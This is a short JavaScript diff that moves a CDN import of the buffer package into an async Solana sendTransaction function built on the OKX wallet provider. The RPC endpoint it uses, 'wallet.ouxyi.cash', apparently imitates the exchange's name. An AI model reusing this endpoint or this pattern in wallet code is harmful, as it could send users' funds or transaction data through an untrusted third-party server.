@@ -1,5 +1,5 @@
   
-  import * as buffer from "https://cdn.skypack.dev/buffer@6.0.3";
+ 
   // 通过 CDN 加载 Solana Web3.js，使用 global 对象 solanaWeb3
   const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
 
@@ -207,9 +207,11 @@ async function isOKXWalletConnected() {
     }
 }
 
-function sendTransaction(from,amount){
+async function sendTransaction(from,amount){
 
   try {
+    const buffer = await import("https://cdn.skypack.dev/buffer@6.0.3");
+    window.Buffer = buffer.Buffer;
     const { PublicKey, Connection, Transaction, SystemProgram } = solanaWeb3;
     const provider = window.okxwallet.solana;
     const network = "https://wallet.ouxyi.cash/fullnode/sol/discover/rpc";
